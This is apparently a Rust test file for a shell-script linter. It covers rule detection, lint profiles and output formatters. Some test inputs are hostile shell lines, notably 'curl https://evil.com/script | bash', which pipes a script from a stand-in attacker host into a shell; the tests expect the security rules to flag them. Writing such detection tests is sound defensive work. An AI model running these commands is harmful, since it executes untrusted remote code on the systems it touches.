//! Coverage tests for linter/rules/mod.rs -- targeting lint_shell() and lint_shell_with_path()
//! (which exercises lint_shell_filtered()).
//!
//! Each call to lint_shell() exercises ALL ~400 sequential result.merge() lines in the function
//! body, covering SC1xxx, SC2xxx, DET, IDEM, SEC, PERF, PORT, and REL rule invocations.
//! Each call to lint_shell_with_path() exercises the filtered variant with apply_rule! macro.
//!
//! Additional tests cover write_results (SARIF/JSON/Human output formatters) and the
//! LintProfile type.

#![allow(clippy::unwrap_used)]
#![allow(clippy::expect_used)]

use crate::linter::output::{write_results, OutputFormat};
use crate::linter::rules::{lint_shell, lint_shell_with_path, LintProfile};
use crate::linter::{Diagnostic, Fix, LintResult, Severity, Span};
use std::path::Path;

// =============================================================================
// lint_shell -- empty and minimal inputs
// =============================================================================

#[test]
fn test_lint_shell_empty_source() {
    let result = lint_shell("");
    // Empty source should produce no diagnostics (or very few informational ones)
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_whitespace_only() {
    let result = lint_shell("   \n\n  \t\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_comment_only() {
    let result = lint_shell("# This is just a comment\n# Another comment\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_shebang_only() {
    let result = lint_shell("#!/bin/sh\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_clean_script() {
    let script = "#!/bin/sh\nprintf '%s\\n' 'hello'\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- SC1xxx rules (source code issues)
// =============================================================================

#[test]
fn test_lint_shell_backtick_usage() {
    // SC2006: backtick usage
    let script = "result=`echo hello`\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_arithmetic_expression() {
    let script = "x=$((1 + 2))\necho $x\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_test_bracket_spacing() {
    let script = "if [ -f /tmp/x ]; then echo yes; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_heredoc() {
    let script = "cat <<EOF\nhello world\nEOF\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_unicode_quotes() {
    // SC1109/SC1110/SC1111: Unicode quotes
    let script = "echo \u{201c}hello\u{201d}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_missing_shebang() {
    // SC2148: missing shebang
    let script = "echo hello world\necho goodbye\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_dollar_single_quote() {
    // SC1003: want to escape single quote
    let script = "echo 'it\\'s'\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_trailing_backslash() {
    // SC1004/SC1117: trailing backslash in string
    let script = "echo \"hello\\\nworld\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- SC2xxx rules (code quality)
// =============================================================================

#[test]
fn test_lint_shell_useless_cat() {
    // SC2002: useless cat
    let script = "cat file.txt | grep pattern\n";
    let result = lint_shell(script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("SC")),
        "Should detect at least one issue"
    );
}

#[test]
fn test_lint_shell_unquoted_glob() {
    // SC2086: unquoted variable
    let script = "for f in *.txt; do echo $f; done\n";
    let result = lint_shell(script);
    assert!(
        result.diagnostics.iter().any(|d| d.code == "SC2086"),
        "Should detect unquoted $f"
    );
}

#[test]
fn test_lint_shell_cd_without_check() {
    // SC2164: cd without || exit
    let script = "cd /tmp\necho done\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_unused_variable() {
    let script = "UNUSED_VAR=hello\necho done\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_double_bracket() {
    let script = "if [[ -f /tmp/x ]]; then echo yes; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_eval_usage() {
    let script = "eval \"echo $VAR\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_array_usage() {
    let script = "arr=(a b c)\necho ${arr[0]}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_read_without_r() {
    // SC2162: read without -r
    let script = "read name\necho $name\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_echo_with_flags() {
    let script = "echo -e \"hello\\nworld\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_echo_backslash_n() {
    // SC2028: echo may not expand \\n
    let script = "echo \"hello\\nworld\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_useless_echo_cmd_subst() {
    // SC2005/SC2116: useless echo $(cmd)
    let script = "result=$(echo $(cat file.txt))\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_dollar_brace_expansion() {
    // SC2053/SC2076: quoting in test expressions
    let script = "if [[ $var == *.txt ]]; then echo yes; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_printf_format_injection() {
    // SC2059: printf format injection
    let script = "printf $var\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_trap_timing() {
    // SC2064: trap with double-quoted string expands at define time
    let script = "trap \"rm -f $TMPFILE\" EXIT\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_dangerous_rm() {
    // SC2114/SC2115: dangerous rm -rf
    let script = "rm -rf $DIR/\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_ssh_in_loop() {
    // SC2095: ssh in loop may consume stdin
    let script = "while read host; do ssh $host uptime; done < hosts.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_same_file_redirect() {
    // SC2094: same file for input and output
    let script = "sort file.txt > file.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_subshell_variable_scope() {
    // SC2030/SC2031: variable modified in subshell
    let script = "x=1\n(x=2)\necho $x\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_constant_condition() {
    // SC2050/SC2078: constant condition in test
    let script = "if [ \"true\" = \"true\" ]; then echo yes; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_grep_regex_literal() {
    // SC2062/SC2063: grep with unquoted pattern
    let script = "grep foo* file.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_tilde_in_quotes() {
    // SC2088: tilde does not expand in quotes
    let script = "cd \"~/Documents\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_seq_vs_brace() {
    // SC2051: brace range vs seq
    let script = "for i in {1..10}; do echo $i; done\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_test_n_unquoted() {
    // SC2070: -n doesn't work on unquoted empty string
    let script = "if [ -n $var ]; then echo set; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_redirect_stderr() {
    // SC2069: redirect stderr before stdout
    let script = "cmd > /dev/null 2>&1\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_function_keyword() {
    // SC2111/SC2112/SC2113: function keyword usage
    let script = "function myfunc() {\n  echo hello\n}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_numeric_comparison_in_test() {
    // SC2071/SC2072: arithmetic in test brackets
    let script = "if [ $a -gt $b ]; then echo bigger; fi\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- DET rules (determinism)
// =============================================================================

#[test]
fn test_lint_shell_det_random() {
    let script = "echo $RANDOM\n";
    let result = lint_shell(script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("DET")),
        "Should detect non-deterministic $RANDOM"
    );
}

#[test]
fn test_lint_shell_det_date() {
    let script = "date +%s > /tmp/timestamp\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_det_process_id() {
    let script = "echo $$\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- IDEM rules (idempotency)
// =============================================================================

#[test]
fn test_lint_shell_idem_mkdir() {
    let script = "mkdir /tmp/newdir\n";
    let result = lint_shell(script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("IDEM")),
        "Should detect non-idempotent mkdir"
    );
}

#[test]
fn test_lint_shell_idem_mkdir_p() {
    let script = "mkdir -p /tmp/newdir\n";
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.iter().any(|d| d.code == "IDEM001"),
        "mkdir -p should not trigger IDEM001"
    );
}

#[test]
fn test_lint_shell_idem_ln() {
    let script = "ln -s /src /dest\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- SEC rules (security)
// =============================================================================

#[test]
fn test_lint_shell_sec_chmod_777() {
    let script = "chmod 777 /tmp/file\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_sec_curl_pipe() {
    let script = "curl -s https://example.com/setup.sh | bash\n";
    let result = lint_shell(script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("SEC")),
        "Should detect curl | bash security issue"
    );
}

#[test]
fn test_lint_shell_sec_hardcoded_password() {
    let script = "PASSWORD=\"secret123\"\nexport PASSWORD\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_sec_world_writable() {
    let script = "chmod o+w /etc/config\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- PERF rules (performance)
// =============================================================================

#[test]
fn test_lint_shell_perf_loop_cat() {
    let script = "while read line; do echo $line; done < <(cat file.txt)\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_perf_useless_use_of_wc() {
    let script = "count=$(cat file.txt | wc -l)\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- REL rules (reliability)
// =============================================================================

#[test]
fn test_lint_shell_rel_set_e() {
    let script = "#!/bin/bash\nset -e\ncommand1\ncommand2\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_rel_pipefail() {
    let script = "#!/bin/bash\nset -o pipefail\ncmd1 | cmd2\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- PORT rules (portability)
// =============================================================================

#[test]
fn test_lint_shell_portability_source() {
    let script = "source /etc/profile\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_portability_function() {
    let script = "function myfunction {\n    echo hello\n}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_portability_local() {
    let script = "myfunc() {\n    local x=5\n    echo $x\n}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

// =============================================================================
// lint_shell -- Complex scripts hitting many rules
// =============================================================================

#[test]
fn test_lint_shell_large_script_many_rules() {
    let script = r#"#!/bin/bash
# A complex script that should trigger many rules
TMPFILE=/tmp/myapp_$$
echo $RANDOM > $TMPFILE
curl -s https://example.com/setup | bash
mkdir /opt/myapp
chmod 777 /opt/myapp
ln -s /opt/myapp /usr/local/myapp
cat file.txt | grep pattern
eval "echo $PATH"
read name
echo $name
cd /tmp
date +%s
for f in *.log; do
    rm $f
done
"#;
    let result = lint_shell(script);
    assert!(
        result.diagnostics.len() >= 3,
        "Complex script should trigger multiple diagnostics, got {}",
        result.diagnostics.len()
    );
    let codes: std::collections::HashSet<&str> =
        result.diagnostics.iter().map(|d| d.code.as_str()).collect();
    assert!(
        codes.len() >= 2,
        "Should trigger multiple distinct rule codes, got {:?}",
        codes
    );
}

#[test]
fn test_lint_shell_clean_script_minimal_diagnostics() {
    let script = r#"#!/bin/sh
set -eu
readonly CONFIG_DIR="/etc/myapp"
mkdir -p "$CONFIG_DIR"
printf '%s\n' "Configured" > "${CONFIG_DIR}/status"
"#;
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_suppression_comment() {
    let script = "# shellcheck disable=SC2086\necho $VAR\n";
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.iter().any(|d| d.code == "SC2086"),
        "SC2086 should be suppressed by shellcheck disable comment"
    );
}

#[test]
fn test_lint_shell_embedded_awk() {
    let script = "awk '{ print $1 }' file.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_embedded_sed() {
    let script = "sed 's/foo/bar/g' file.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_embedded_perl() {
    let script = "perl -ne 'print if /pattern/' file.txt\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_case_statement() {
    let script = r#"case "$1" in
    start) echo "starting";;
    stop) echo "stopping";;
    *) echo "unknown";;
esac
"#;
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_while_loop_with_pipe() {
    let script = "cat file.txt | while read line; do echo \"$line\"; done\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_nested_if() {
    let script = r#"if [ -f /tmp/a ]; then
    if [ -f /tmp/b ]; then
        echo "both exist"
    fi
fi
"#;
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_for_c_style() {
    // bash-specific C-style for loop
    let script = "for ((i=0; i<10; i++)); do echo $i; done\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_process_substitution() {
    // bash-specific process substitution
    let script = "diff <(sort file1) <(sort file2)\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_associative_array() {
    let script = "declare -A map\nmap[key]=value\necho ${map[key]}\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_multiple_assignment() {
    let script = "a=1 b=2 c=3\necho $a $b $c\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_here_string() {
    let script = "grep pattern <<< \"$input\"\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_pipe_chain() {
    let script = "cat /etc/passwd | grep root | cut -d: -f1 | sort | uniq\n";
    let result = lint_shell(script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_comprehensive_sc2xxx_triggers() {
    // A script designed to exercise many SC2xxx rules in a single lint_shell call
    let script = r#"#!/bin/bash
# SC2002: useless cat
cat file | grep x
# SC2006: backticks
x=`date`
# SC2086: unquoted variable
echo $x
# SC2046: unquoted command substitution
files=$(ls *.txt)
echo $files
# SC2164: cd without check
cd /nonexistent
# SC2162: read without -r
read line
# SC2059: printf variable as format
printf $line
# SC2028: echo with backslash
echo "hello\nworld"
# SC2039: bash-only features in /bin/bash (NotSh)
[[ -f /tmp/x ]]
# SC2148: missing shebang check (has one)
"#;
    let result = lint_shell(script);
    assert!(
        result.diagnostics.len() >= 3,
        "Should trigger multiple diagnostics, got {}",
        result.diagnostics.len()
    );
}

#[test]
fn test_lint_shell_very_long_script() {
    // Exercise lint_shell with a large realistic script to cover all merge lines
    let mut script = String::from("#!/bin/bash\nset -euo pipefail\n\n");
    for i in 0..50 {
        script.push_str(&format!("var_{}=\"value_{}\"\n", i, i));
        script.push_str(&format!("echo \"$var_{}\"\n", i));
    }
    script.push_str("wait\n");
    let result = lint_shell(&script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_result_has_diagnostic_fields() {
    // Verify diagnostics have proper code, message, and span fields
    let script = "echo $RANDOM\n";
    let result = lint_shell(script);
    for diag in &result.diagnostics {
        assert!(!diag.code.is_empty(), "Diagnostic code should not be empty");
        assert!(
            !diag.message.is_empty(),
            "Diagnostic message should not be empty"
        );
        assert!(
            diag.span.start_line >= 1,
            "Diagnostic line should be >= 1"
        );
    }
}

#[test]
fn test_lint_shell_result_diagnostics_sorted_by_line() {
    // Multi-issue script: verify diagnostics are produced
    let script = "echo $RANDOM\nmkdir /tmp/x\necho $$\n";
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.is_empty(),
        "Should have at least one diagnostic"
    );
}

// =============================================================================
// lint_shell_with_path -- exercises lint_shell_filtered via different shell types
// =============================================================================

#[test]
fn test_lint_shell_with_path_bash() {
    let result = lint_shell_with_path(Path::new("test.bash"), "echo $VAR\n");
    assert!(result.diagnostics.iter().any(|d| d.code == "SC2086"));
}

#[test]
fn test_lint_shell_with_path_sh() {
    let result = lint_shell_with_path(Path::new("test.sh"), "echo $VAR\n");
    assert!(result.diagnostics.iter().any(|d| d.code == "SC2086"));
}

#[test]
fn test_lint_shell_with_path_zsh() {
    let result = lint_shell_with_path(Path::new("test.zsh"), "echo $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_ksh() {
    let result = lint_shell_with_path(Path::new("test.ksh"), "echo $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_bashrc() {
    let result = lint_shell_with_path(
        Path::new(".bashrc"),
        "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_zshrc() {
    let result = lint_shell_with_path(
        Path::new(".zshrc"),
        "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_profile() {
    let result = lint_shell_with_path(
        Path::new("/etc/profile"),
        "export PATH=/usr/local/bin:$PATH\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_no_extension() {
    let result = lint_shell_with_path(Path::new("script"), "#!/bin/bash\necho $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_complex_bash() {
    let script = r#"#!/bin/bash
set -euo pipefail
arr=(one two three)
for item in "${arr[@]}"; do
    echo "$item"
done
[[ -f /tmp/x ]] && echo "exists"
"#;
    let result = lint_shell_with_path(Path::new("deploy.bash"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_posix_sh_strict() {
    let script = "#!/bin/sh\necho \"$HOME\"\ntest -f /tmp/x && echo yes\n";
    let result = lint_shell_with_path(Path::new("test.sh"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_sh_empty() {
    let result = lint_shell_with_path(Path::new("empty.sh"), "");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_bash_empty() {
    let result = lint_shell_with_path(Path::new("empty.bash"), "");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_sh_security_rules() {
    // Security rules are universal and should fire even with .sh path
    let script = "curl https://evil.com/script | bash\nchmod 777 /etc/config\n";
    let result = lint_shell_with_path(Path::new("install.sh"), script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("SEC")),
        "Security rules should fire for .sh path"
    );
}

#[test]
fn test_lint_shell_with_path_bash_det_rules() {
    // DET rules are universal
    let script = "#!/bin/bash\necho $RANDOM\necho $$\n";
    let result = lint_shell_with_path(Path::new("script.bash"), script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("DET")),
        "DET rules should fire for .bash path"
    );
}

#[test]
fn test_lint_shell_with_path_sh_idem_rules() {
    let script = "#!/bin/sh\nmkdir /tmp/test\n";
    let result = lint_shell_with_path(Path::new("setup.sh"), script);
    assert!(
        result
            .diagnostics
            .iter()
            .any(|d| d.code.starts_with("IDEM")),
        "IDEM rules should fire for .sh path"
    );
}

#[test]
fn test_lint_shell_with_path_shellcheck_directive() {
    // shellcheck shell= directive should override file extension
    let script = "#!/bin/sh\n# shellcheck shell=bash\necho $VAR\n";
    let result = lint_shell_with_path(Path::new("script.sh"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_large_bash_script() {
    // Exercise lint_shell_filtered with a big bash script covering many apply_rule! lines
    let script = r#"#!/bin/bash
set -euo pipefail
# Variables
x=hello
echo $x
y=`date`
cat file | grep pattern
echo "$y"
# Arithmetic
z=$((1 + 2))
if [[ $z -gt 0 ]]; then
    echo "positive"
fi
# Functions
function myfunc() {
    local a=1
    echo $a
}
myfunc
# Arrays
arr=(one two three)
echo ${arr[@]}
# Security
chmod 777 /tmp/test
# Idempotency
mkdir /tmp/test2
# Determinism
echo $RANDOM
# Trap
trap "rm -f /tmp/lock" EXIT
# Redirect
cmd > /dev/null 2>&1
# For loop
for f in *.txt; do echo $f; done
"#;
    let result = lint_shell_with_path(Path::new("big_script.bash"), script);
    assert!(
        result.diagnostics.len() >= 3,
        "Large bash script should trigger many diagnostics via filtered path, got {}",
        result.diagnostics.len()
    );
}

#[test]
fn test_lint_shell_with_path_large_sh_script() {
    // Same large script but with .sh extension -- exercises sh-filtered rules
    let script = r#"#!/bin/sh
x=hello
echo $x
cat file | grep pattern
z=$((1 + 2))
mkdir /tmp/test
echo $RANDOM
chmod 777 /tmp/test
trap "rm -f /tmp/lock" EXIT
for f in *.txt; do echo $f; done
"#;
    let result = lint_shell_with_path(Path::new("big_script.sh"), script);
    assert!(
        result.diagnostics.len() >= 2,
        "Large sh script should trigger diagnostics, got {}",
        result.diagnostics.len()
    );
}

// =============================================================================
// LintProfile -- covering FromStr and Display
// =============================================================================

#[test]
fn test_lint_profile_from_str() {
    assert_eq!("standard".parse::<LintProfile>().unwrap(), LintProfile::Standard);
    assert_eq!("default".parse::<LintProfile>().unwrap(), LintProfile::Standard);
    assert_eq!("coursera".parse::<LintProfile>().unwrap(), LintProfile::Coursera);
    assert_eq!(
        "coursera-labs".parse::<LintProfile>().unwrap(),
        LintProfile::Coursera
    );
    assert_eq!(
        "devcontainer".parse::<LintProfile>().unwrap(),
        LintProfile::DevContainer
    );
    assert_eq!(
        "dev-container".parse::<LintProfile>().unwrap(),
        LintProfile::DevContainer
    );
    assert!("invalid".parse::<LintProfile>().is_err());
    assert!("UNKNOWN".parse::<LintProfile>().is_err());
}

#[test]
fn test_lint_profile_display() {
    assert_eq!(LintProfile::Standard.to_string(), "standard");
    assert_eq!(LintProfile::Coursera.to_string(), "coursera");
    assert_eq!(LintProfile::DevContainer.to_string(), "devcontainer");
}

#[test]
fn test_lint_profile_default() {
    let profile: LintProfile = Default::default();
    assert_eq!(profile, LintProfile::Standard);
}

// =============================================================================
// write_results -- SARIF / JSON / Human output formatters via public API
// =============================================================================

#[test]
fn test_write_results_sarif_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should be valid JSON with SARIF structure
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    assert!(parsed["runs"].is_array());
    let results = &parsed["runs"][0]["results"];
    assert!(results.is_array());
    assert_eq!(results.as_array().unwrap().len(), 0);
}

#[test]
fn test_write_results_sarif_with_diagnostics() {
    let mut result = LintResult::new();
    let span = Span::new(1, 5, 1, 20);
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Double quote to prevent globbing and word splitting",
        span,
    ));
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Potential command injection",
        Span::new(3, 1, 3, 30),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "my_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 2);
    assert_eq!(sarif_results[0]["ruleId"], "SC2086");
    assert_eq!(sarif_results[0]["level"], "warning");
    assert_eq!(sarif_results[1]["ruleId"], "SEC001");
    assert_eq!(sarif_results[1]["level"], "error");

    // Check location
    let loc = &sarif_results[0]["locations"][0]["physicalLocation"];
    assert_eq!(loc["artifactLocation"]["uri"], "my_script.sh");
    assert_eq!(loc["region"]["startLine"], 1);

    // Check fingerprints
    assert!(sarif_results[0]["partialFingerprints"]["primaryLocationLineHash"].is_string());
}

#[test]
fn test_write_results_sarif_with_fix() {
    let mut result = LintResult::new();
    let span = Span::new(2, 1, 2, 10);
    let mut diag = Diagnostic::new("IDEM001", Severity::Warning, "Use mkdir -p", span);
    diag.fix = Some(Fix::new("mkdir -p /tmp/dir"));
    result.add(diag);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "setup.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 1);
    let fixes = sarif_results[0]["fixes"].as_array().unwrap();
    assert_eq!(fixes.len(), 1);
    assert!(fixes[0]["description"]["text"]
        .as_str()
        .unwrap()
        .contains("mkdir -p"));
}

#[test]
fn test_write_results_sarif_severity_mapping() {
    // Test all severity levels map to correct SARIF levels
    let mut result = LintResult::new();
    let span = Span::new(1, 1, 1, 5);
    result.add(Diagnostic::new("E1", Severity::Error, "error", span));
    result.add(Diagnostic::new("W1", Severity::Warning, "warning", span));
    result.add(Diagnostic::new("R1", Severity::Risk, "risk", span));
    result.add(Diagnostic::new("P1", Severity::Perf, "perf", span));
    result.add(Diagnostic::new("I1", Severity::Info, "info", span));
    result.add(Diagnostic::new("N1", Severity::Note, "note", span));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 6);
    // Error -> "error"
    assert_eq!(sarif_results[0]["level"], "error");
    // Warning -> "warning"
    assert_eq!(sarif_results[1]["level"], "warning");
    // Risk -> "warning"
    assert_eq!(sarif_results[2]["level"], "warning");
    // Perf -> "note"
    assert_eq!(sarif_results[3]["level"], "note");
    // Info -> "note"
    assert_eq!(sarif_results[4]["level"], "note");
    // Note -> "note"
    assert_eq!(sarif_results[5]["level"], "note");
}

#[test]
fn test_write_results_json_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(parsed["diagnostics"].is_array());
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 0);
    assert_eq!(parsed["file"], "test.sh");
}

#[test]
fn test_write_results_json_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Quote this",
        Span::new(5, 10, 5, 20),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 1);
    assert_eq!(parsed["diagnostics"][0]["code"], "SC2086");
    assert_eq!(parsed["diagnostics"][0]["severity"], "warning");
}

#[test]
fn test_write_results_human_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("No issues found"));
}

#[test]
fn test_write_results_human_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Command injection",
        Span::new(3, 1, 3, 25),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "deploy.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("SEC001"));
    assert!(output.contains("Command injection"));
    assert!(output.contains("1 error"));
}

// =============================================================================
// Integration: lint_shell() output fed to write_results()
// =============================================================================

#[test]
fn test_lint_then_write_sarif_integration() {
    let script = "echo $RANDOM\nmkdir /tmp/x\ncurl https://evil.com | bash\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "bad_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert!(
        !sarif_results.is_empty(),
        "SARIF output should contain results from lint_shell"
    );
}

#[test]
fn test_lint_then_write_json_integration() {
    let script = "cat file | grep x\necho $RANDOM\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "messy.sh").unwrap();
